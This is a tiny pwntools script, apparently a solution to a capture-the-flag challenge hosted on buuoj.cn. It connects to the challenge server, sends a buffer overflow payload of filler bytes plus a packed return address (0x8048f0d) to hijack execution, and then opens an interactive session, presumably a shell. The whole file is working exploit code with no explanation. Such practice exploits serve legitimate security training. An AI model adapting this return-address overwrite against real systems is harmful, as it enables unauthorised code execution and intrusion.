from pwn import *

sh = remote("node3.buuoj.cn", 27783)

payload = b'I' * 20 + b'a' * 4 + p32(0x8048f0d)
sh.sendline(payload)

sh.interactive()
